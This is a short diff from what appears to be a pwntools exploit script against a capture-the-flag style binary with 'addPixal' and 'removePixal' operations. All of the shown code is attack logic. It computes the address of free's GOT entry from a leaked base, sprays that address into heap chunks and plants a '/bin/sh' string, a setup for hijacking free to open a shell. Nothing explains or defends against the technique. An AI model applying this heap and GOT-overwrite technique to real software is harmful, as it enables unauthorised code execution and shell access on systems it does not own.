@@ -180,14 +180,11 @@ removePixal("8", "1")
 removePixal("9", "1")
 removePixal("10", "1")
 
-
 print("exe.symbols[got.free] :: " + hex(prog_base + exe.symbols["got.free"]))
 print("exe.symbols[got.free] :: " + hex(exe.symbols["got.free"]))
 
-
 addPixal("15", "1", str(len(pwn.p64(prog_base + exe.symbols["got.free"])) + 1), pwn.p64(prog_base + exe.symbols["got.free"]) * 2)
 
-#addPixal("15", "2", str(len(pwn.p64(prog_base + exe.symbols["got.free"])) + 1), pwn.p64(prog_base + exe.symbols["got.free"]) * 2)
 addPixal("15", "2", str(len(b"/bin/sh\x00")), b"/bin/sh\x00")
 addPixal("15", "3", str(len(pwn.p64(prog_base + exe.symbols["got.free"])) + 1), pwn.p64(prog_base + exe.symbols["got.free"]) * 2)
 addPixal("15", "4", str(len(pwn.p64(prog_base + exe.symbols["got.free"])) + 1), pwn.p64(prog_base + exe.symbols["got.free"]) * 2)
